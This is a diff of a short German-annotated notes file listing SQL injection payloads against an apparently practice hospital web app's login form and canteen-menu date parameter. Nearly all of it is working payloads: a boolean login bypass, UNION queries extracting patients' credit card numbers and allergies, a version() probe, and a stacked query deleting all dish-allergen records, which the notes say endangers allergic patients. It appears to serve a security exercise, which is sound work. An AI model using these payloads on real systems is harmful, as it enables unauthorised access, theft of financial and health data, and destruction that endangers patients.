@@ -1,15 +1,23 @@
 Login Form:
+	Im Text-Input für den Username, Ergebnis kann mit Entwickler-Tools im Browser gesehen werden
 
 ' OR 1=1;--
+	[Boolean] Umgeht den Login ohne ein Passwort eingeben zu müssen
 
 ' UNION SELECT patientId, creditcardnumber FROM Patients;--
+	[Union] Gibt die ID und Kreditkartennummer jedes Patienten zurück
 ' UNION SELECT patientId, allergen FROM PatientAllergen;--
+	[Union] Gibt aller Allergien jedes Patienten zurück
 
 Canteen Menu:
+	Mit Entwickler-Tools im Browser kann ein Request an den Speiseplan erneut gesendet werden. Dabei kann das angefragte Datum in der URI verändert werden.
 
 2023-01-04' OR 1=1;--
-2023-01-04' OR date='2023-01-04';--
+	[Boolean] Zeigt alle Gerichte zu jedem Datum an
+2023-01-04' OR date='2023-02-15';--
+	[Boolean] Zeigt alle Gerichte, einschließlich des täglichen Überraschungsgericht, zu einem bestimmten Datum an
 2020-01-01' UNION SELECT 0, version(), '$10.00';--
+	[Union] Führt die PostgreSQL Funktion version aus und gibt das Ergebnis zurück
 
-Delete Tables:
-';DELETE FROM DishAllergen;--
+2020-01-01';DELETE FROM DishAllergen;--
+	[Stacked-Query] Löscht alle in der Datenbank gespeicherten Allergene zu Gerichten. Somit können Patienten mit Allergien nicht mehr wissen, welche Gerichte sie essen können.
